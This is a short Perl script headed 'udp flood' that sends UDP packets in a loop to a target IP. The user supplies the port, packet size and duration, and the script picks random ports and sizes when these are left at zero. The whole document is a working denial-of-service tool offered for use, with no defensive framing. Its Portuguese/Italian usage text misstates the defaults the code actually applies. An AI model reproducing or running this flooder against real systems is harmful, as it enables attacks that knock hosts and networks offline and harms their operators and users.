#!/usr/bin/perl

##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "./cc <ip> <port> <size> <time>\n\n";
  print " port=0: usar a porta 80\n";
  print " size=0: usar maximo 5000 packets\n";
  print " time=0: usar maximo 1000 secondi\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "impossivel resolver a host $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "Ez peazwewew  $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Parar com Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
